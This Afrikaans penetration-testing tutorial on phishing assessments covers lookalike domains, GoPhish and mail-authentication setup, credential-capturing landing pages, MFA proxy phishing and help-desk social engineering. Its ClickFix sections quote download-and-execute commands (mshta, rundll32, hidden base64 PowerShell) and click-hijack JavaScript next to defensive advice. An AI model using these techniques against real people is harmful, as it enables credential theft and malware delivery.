# Phishing-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Doen verkenning van die slagoffer
1. Kies die **slagofferdomein**.
2. Voer basiese web-enumerasie uit deur **aanmeldportale te soek** wat deur die slagoffer gebruik word en **besluit** watter een jy gaan **naboots**.
3. Gebruik **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
1. **Koop die domein** wat jy vir die phishing-assessment gaan gebruik
2. **Konfigureer die e-posdiens se** verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die veldtog voor
1. Berei die **e-possjabloon** voor
2. Berei die **webblad** voor om die geloofsbriewe te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop ’n betroubare domein

### Tegnieke vir domeinnaamvariasie

- **Sleutelwoord**: Die domeinnaam **bevat** ’n belangrike **sleutelwoord** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomein met koppelteken**: Verander die **punt na ’n koppelteken** van ’n subdomein (bv. www-zelster.com).
- **Nuwe TLD**: Dieselfde domein met ’n **nuwe TLD** (bv. zelster.org)
- **Homoglyph**: Dit **vervang** ’n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters** binne die domeinnaam om (bv. zelsetr.com).
- **Singularization/Pluralization**: Voeg “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
- **Weglating**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
- **Herhaling:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
- **Vervanging**: Soos homoglyph, maar minder heimlik. Dit vervang een van die letters in die domeinnaam, moontlik met ’n letter naby die oorspronklike letter op die sleutelbord (bv. zektser.com).
- **Subdomein**: Voeg ’n **punt** binne die domeinnaam in (bv. ze.lster.com).
- **Invoeging**: Dit **voeg ’n letter** by die domeinnaam (bv. zerltser.com).
- **Ontbrekende punt**: Voeg die TLD by die domeinnaam. (bv. zelstercom.com)

**Outomatiese nutsmiddels**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webwerwe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is ’n **moontlikheid dat een van sommige bisse wat gestoor word of in kommunikasie is, outomaties kan omkeer** weens verskeie faktore, soos sonvlamme, kosmiese strale of hardewarefoute.

Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat deur die DNS-bediener ontvang word** nie dieselfde is as die domein wat aanvanklik versoek is nie.

Byvoorbeeld, kan ’n enkele biswysiging in die domein "windows.com" dit na "windnws.com" verander.

Aanvallers kan **dit benut deur verskeie bit-flipping-domeine te registreer** wat soortgelyk aan die slagoffer se domein is. Hulle doel is om wettige gebruikers na hul eie infrastruktuur te herlei.

Lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) vir meer inligting.<sup>[[10]](#references)[[11]](#references)</sup>

### Koop ’n betroubare domein

Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) na ’n vervalde domein soek wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **reeds goeie SEO het**, kan jy nagaan hoe dit gekategoriseer word in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdekking van e-posadresse

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy nagaan of jy dit teen die slagoffer se SMTP-bedieners kan brute-force. [Leer hier hoe om e-posadresse te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet dat, indien die gebruikers **enige webportaal gebruik om toegang tot hul e-posse te verkry nie**, jy kan nagaan of dit kwesbaar is vir **username brute force**, en die kwesbaarheid kan uitbuit indien moontlik.

## Konfigurering van GoPhish

### Installasie

Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af, dekomprimeer dit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
Jy sal ’n wagwoord vir die admin-gebruiker op poort 3333 in die uitvoer kry. Kry dus toegang tot daardie poort en gebruik daardie geloofsbriewe om die admin-wagwoord te verander. Jy sal moontlik daardie poort na plaaslik moet tonnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap behoort jy **reeds die domein gekoop te hê** wat jy gaan gebruik, en dit moet **na die IP van die VPS wys** waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Posopstelling**

Begin met die installering: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Verander laastens die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou ’n **DNS A record** vir `mail.<domain>` wat na die **IP-adres** van die VPS wys, asook ’n **DNS MX**-record wat na `mail.<domain>` wys.

Kom ons toets nou om ’n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-konfigurasie**

Stop die uitvoering van gophish en kom ons konfigureer dit.\
Wysig `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish-diens**

Om die gophish-diens te skep sodat dit outomaties begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die konfigurasie van die diens en kontroleer dit deur:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer mail server en domein

### Wag en wees legitiem

Hoe ouer ’n domein is, hoe minder waarskynlik is dit dat dit as spam gemerk sal word. Daarom moet jy so lank as moontlik wag (ten minste 1 week) voordat die phishing-assessering plaasvind. Boonop sal die reputasie wat verkry word beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.

Let daarop dat jy, selfs al moet jy ’n week wag, alles nou kan klaar konfigureer.

### Konfigureer Reverse DNS (rDNS)-rekord

Stel ’n rDNS (PTR)-rekord op wat die IP-adres van die VPS na die domeinnaam oplos.

### Sender Policy Framework (SPF)-rekord

Jy moet **’n SPF-rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n SPF-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP van die VPS-masjien).

![SPF Wizard-vorm vir die generering van ’n SPF-rekord vir ’n phishing-domein](<../../images/image (1037).png>)

Dit is die inhoud wat binne ’n TXT-rekord binne die domein gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domeingebaseerde Message Authentication, Reporting & Conformance (DMARC)-rekord

Jy moet **’n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet ’n nuwe DNS TXT-rekord skep wat na die hostname `_dmarc.<domain>` wys, met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein opstel**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie handleiding is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Jy moet albei B64-waardes wat die DKIM-sleutel genereer, saamvoeg:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasietelling

Jy kan dit doen met [https://www.mail-tester.com/](https://www.mail-tester.com)\
Gaan bloot na die bladsy en stuur 'n e-pos na die adres wat hulle aan jou verskaf:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook **jou e-poskonfigurasie nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en **die antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ moet sien as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook ’n **boodskap na ’n Gmail-rekening onder jou beheer stuur**, en die **e-pos se opskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results`-kopveld teenwoordig te wees.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Verwydering van Spamhaus Blacklist

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur Spamhaus geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van Microsoft Blacklist

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish Campaign

### Sending Profile

- Stel ’n **naam in om** die senderprofiel **te identifiseer**
- Besluit vanaf watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Skep & Begin GoPhish Campaign - Sending Profile: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**"-funksie te gebruik om te toets of alles werk.\
> Ek sal aanbeveel om die toets-e-posse na 10min-e-posadresse te stuur om te voorkom dat jy tydens die toetse op ’n blacklist beland.

### E-pos Template

- Stel ’n **naam in om** die template **te identifiseer**
- Skryf dan ’n **onderwerp** (niks vreemds nie, net iets wat jy sou verwag om in ’n gewone e-pos te lees)
- Maak seker dat jy "**Add Tracking Image**" gemerk het
- Skryf die **e-pos template** (jy kan veranderlikes soos in die volgende voorbeeld gebruik):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om ’n handtekening uit ’n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur ’n e-pos na ’n **nie-bestaande adres** en kyk of die antwoord enige handtekening bevat.
- Soek vir **publieke e-posadresse** soos info@ex.com of press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
- Probeer om ’n **geldige ontdekte** e-posadres te kontak en wag vir die antwoord

![Sending Profile - Email Template: Probeer om ’n geldige ontdekte e-posadres te kontak en wag vir die antwoord](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM challenges wil steel deur spesiaal vervaardigde lêers/dokumente te gebruik, [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf ’n **naam**
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **import**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel ’n **redirection**

![Email Template - Landing Page: Merk Capture Submitted Data en Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en plaaslik ’n paar toetse moet uitvoer (moontlik deur ’n Apache-bediener te gebruik) **totdat jy van die resultate hou.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat as jy **statiese hulpbronne** vir die HTML moet **use** (moontlik sommige CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dit dan vanaf _**/static/\<filename>**_ kan access.

> [!TIP]
> Vir die redirection kan jy die gebruikers **redirect na die legitieme hoofwebblad** van die slagoffer, of hulle byvoorbeeld na _/static/migration.html_ redirect, ’n **spinning wheel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes plaas en dan aandui dat die proses suksesvol was**.

### Users & Groups

- Stel ’n naam
- **Import die data** (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)

![Landing Page - Users & Groups: Import die data (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)](<../../images/image (163).png>)

### Campaign

Skep laastens ’n campaign deur ’n naam, die email template, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk**:

![Users & Groups - Campaign: Let daarop dat die Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk](<../../images/image (192).png>)

Sodra alles gereed is, launch net die campaign!

## Website Cloning

As jy om enige rede die webblad wil clone, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assessments (hoofsaaklik vir Red Teams) sal jy ook **lêers wil stuur wat een of ander soort backdoor bevat** (moontlik ’n C2 of dalk net iets wat ’n authentication sal trigger).\
Kyk na die volgende bladsy vir ’n paar voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is redelik slim, aangesien jy ’n werklike webblad namaak en die inligting versamel wat deur die gebruiker ingevoer word. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie, of as die toepassing wat jy nagemaak het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie**.

Dit is waar nutsmiddels soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie nutsmiddels laat jou toe om ’n MitM-agtige aanval te genereer. Basies werk die aanvalle soos volg:

1. Jy **boots die login**-vorm van die werklike webblad **na**.
2. Die gebruiker **stuur** sy **credentials** na jou fake bladsy, en die nutsmiddel stuur dit na die werklike webblad, **terwyl dit kontroleer of die credentials werk**.
3. As die rekening met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra, en sodra die **gebruiker dit invoer**, sal die nutsmiddel dit na die werklike webblad stuur.
4. Sodra die gebruiker geauthentiseer is, sal jy (as aanvaller) die **credentials, die 2FA, die cookie en enige inligting** van elke interaksie hê wat plaasgevind het terwyl die nutsmiddel ’n MitM uitvoer.

### Via VNC

Wat as jy, in plaas daarvan om die **slagoffer na ’n kwaadwillige bladsy** met dieselfde voorkoms as die oorspronklike te stuur, hom na ’n **VNC-sessie met ’n browser wat aan die werklike webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die gebruikte MFA, die cookies...\
Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) doen.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Een van die beste maniere om natuurlik te weet of jy uitgevang is, is om jou **domein binne blacklists te soek**. As dit gelys word, is jou domein op een of ander manier as verdag opgespoor.\
Een maklike manier om te kyk of jou domein in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.

Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die wild soek**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan ’n **domein met ’n baie soortgelyke naam** as die slagoffer se domein **koop en/of ’n sertifikaat genereer** vir ’n **subdomein** van ’n domein wat deur jou beheer word, wat die slagoffer se domein se **keyword** bevat. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat hy **aktief na** verdagte domeine **soek**, en jy sal baie stealthy moet wees.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spam-lêergids gaan beland, of geblokkeer of suksesvol gaan wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend e-pos-lokmiddels heeltemal oor en **teiken die service-desk / identity-recovery-workflow direk** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operator geldige credentials besit, beweeg hy lateraal met ingeboude admin tooling – geen malware word benodig nie.<sup>[[6]](#references)</sup>

### Attack flow
1. Recon die slagoffer
* Versamel persoonlike en korporatiewe besonderhede vanaf LinkedIn, data breaches, publieke GitHub, ens.
* Identifiseer hoëwaarde-identiteite (bestuurders, IT, finansies) en bepaal die **presiese help-desk-proses** vir wagwoord- / MFA-reset.
2. Real-time social engineering
* Bel, Teams of chat met die help-desk terwyl jy jou as die teiken voordoen (dikwels met **spoofed caller-ID** of ’n **geklone stem**).
* Verskaf die voorheen versamelde PII om kennisgebaseerde verifikasie te slaag.
* Oortuig die agent om die **MFA-secret te reset** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
3. Immediate post-access actions (≤60 min in real cases)
* Vestig ’n foothold deur enige web-SSO-portaal.
* Enumerate AD / AzureAD met ingeboude nutsmiddels (geen binaries word dropped nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement met **WMI**, **PsExec** of wettige **RMM**-agents wat reeds in die omgewing gewhitelist is.

### Detection & Mitigation
* Behandel help-desk identity recovery as ’n **bevoorregte operasie** – vereis step-up authentication en bestuurdergoedkeuring.
* Implementeer **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat waarskuwings genereer vir:
* MFA-metode verander + authentication vanaf ’n nuwe toestel / geo.
* Onmiddellike elevation van dieselfde principal (user-→-admin).
* Neem help-desk-oproepe op en vereis ’n **call-back na ’n reeds geregistreerde nommer** voordat enige reset uitgevoer word.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut geresette rekeninge nie outomaties hoëprivilegie-tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews verreken die koste van high-touch ops met massa-aanvalle wat **search engines & ad networks as die delivery channel gebruik**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** stoot ’n fake resultaat soos `chromium-update[.]site` na die boonste posisie in search ads.
2. Die slagoffer download ’n klein **first-stage loader** (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Die loader exfiltreer browser-cookies + credential DBs, en haal dan ’n **silent loader** wat – *in realtime* – besluit of dit die volgende moet deploy:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokkeer nuutgeregistreerde domeine en dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-pos.
* Beperk software-installation tot signed MSI / Store-packages, en weier `HTA`, `ISO`, `VBS`-uitvoering volgens beleid.
* Monitor vir child processes van browsers wat installers oopmaak:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt vir LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Sommige fake software-portale hou die sigbare download-`href` na die **werklike GitHub/release-URL** gerig, maar hijack die **eerste** gebruikerinteraksie in JavaScript en stuur die slagoffer eerder na ’n **Traffic Distribution System (TDS)**-ketting.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sleutelkenmerke:
- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, dus word dit vóór werfhandlers uitgevoer.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** gekoppel te hou en popup-blocker-bypass te verbeter.
- Sommige variante maak vooraf `about:blank` oop of sintetiseer `<a target="_blank">`-klikke, en ken eers later die TDS-URL toe.
- Browser-side limiete word dikwels in `localStorage` gestoor, dus kan die **eerste klik** malware bereik, terwyl refreshes/herprobeersels terugval na die goedaardig lykende sigbare skakel.
- Die TDS kan volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter-kontroles, klik-konteks en tellers per sessie filter, wat herhalings deur analiste nie-deterministies maak.

Idees vir verdedigers:
- Vergelyk die **vertoonde** `href` met die **werklike** navigasieteiken wat met die kliktyd gegenereer word.
- Soek na `document.addEventListener(..., true)`-handlers wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of sintetiese ankerklikke aanroep.
- Behandel groepe nuut-geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront/JS-stage laai as ’n hoë-sein SEO-poisoning/TDS-patroon.

### ClickFix vanaf vals verifikasiebladsye + LOLBAS-fetches wat soos argiewe lyk
Sommige TDS-vertakkings eindig op ’n vals verifikasiebladsy (Cloudflare/IUAM-styl) wat die slagoffer aansê om ’n vertroude Windows-binêre lêer soos:<sup>[[9]](#references)</sup> te laat loop.
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notas:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor dat dit 'n `.7z`-argief is; bygevoegde argiefdata kan suiwer misleiding wees.
- Opvolgstadiums hou dikwels aan om oor die lêertipe te lieg (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgestopte binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
- Indien jy op een van hierdie kettings reageer, behou **network + memory vanaf die eerste suksesvolle uitvoering**: latere herhalings wys dalk slegs 'n skadelose installer/SFX-pad of misluk omdat die payload/key release aan die oorspronklike TDS-sessie gebind was.

### ClickFix DLL-afleweringstegnieke (vals CERT-opdatering)
* Lokmiddel: 'n gekloonde nasionale CERT-advisory met 'n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om 'n batch-lêer uit te voer wat 'n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
* Tipiese batch-ketting wat waargeneem is:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` plaas die payload in `%TEMP%`, 'n kort slaaptyd verberg network-jitter, waarna `rundll32` die uitgevoerde entrypoint (`notepad`) oproep.
* Die DLL stuur host-identiteit en poll C2 elke paar minute. Afgeleë tasking arriveer as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2-buigsaamheid (die server kan take omruil sonder om die DLL op te dateer) en verberg console-windows. Soek na PowerShell-kinderprosesse van `rundll32.exe` waar `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik word.
* Defenders kan HTTP(S)-callbacks van die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute polling-intervalle ná DLL-load opspoor.

---

## Phishing-operasies verbeter deur AI
Attackers koppel nou **LLM- en voice-clone-API's** vir volledig gepersonaliseerde lokmiddels en intydse interaksie.

| Layer | Voorbeeldgebruik deur threat actor |
|-------|-----------------------------------|
|Automation|Genereer & stuur >100 k e-posse / SMS'e met gerandomiseerde bewoording & tracking links.|
|Generative AI|Produseer *eenmalige* e-posse wat na openbare M&A verwys, binnegrappies uit social media; deep-fake CEO-stem in callback scam.|
|Agentic AI|Registreer domains outonoom, scrape open-source intel, en stel next-stage e-posse saam wanneer 'n slagoffer klik maar nie credentials indien nie.|

**Defence:**
• Voeg **dynamic banners** by wat boodskappe uit onbetroubare automation uitlig (via ARC/DKIM-anomalieë).
• Ontplooi **voice-biometric challenge phrases** vir hoërisiko-telefoniese versoeke.
• Simuleer voortdurend AI-gegenereerde lokmiddels in awareness-programme – statiese templates is verouderd.

Sien ook – agentic browsing abuse vir credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – AI agent abuse van plaaslike CLI-tools en MCP (vir secrets inventory en detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly van phishing-JavaScript (in-browser codegen)

